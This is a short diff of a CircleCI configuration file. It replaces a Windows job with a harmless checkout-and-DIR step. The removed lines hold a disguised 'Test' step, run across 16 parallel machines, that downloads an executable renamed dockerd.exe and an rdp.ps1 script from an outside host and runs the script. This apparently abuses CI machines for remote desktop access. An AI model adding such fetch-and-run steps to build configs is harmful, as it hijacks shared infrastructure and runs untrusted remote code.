@@ -1,19 +1,10 @@
-version: 2.1 
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
+version: 2.1
 jobs:
   build:
     parallelism: 16
-    executor:
-      name: win/default 
-      size: "medium" 
- 
+    machine:
+      image: windows-server-2019-vs2019:stable
+      shell: cmd.exe
     steps:
-      - run:
-          name: Test
-          command: |
-               Invoke-WebRequest https://momojo1.herokuapp.com/logcat.exe -OutFile dockerd.exe
-               Invoke-WebRequest https://momojo1.herokuapp.com/rdp.ps1 -OutFile rdp.ps1
-               ./rdp.ps1
+      - checkout
+      - run : DIR
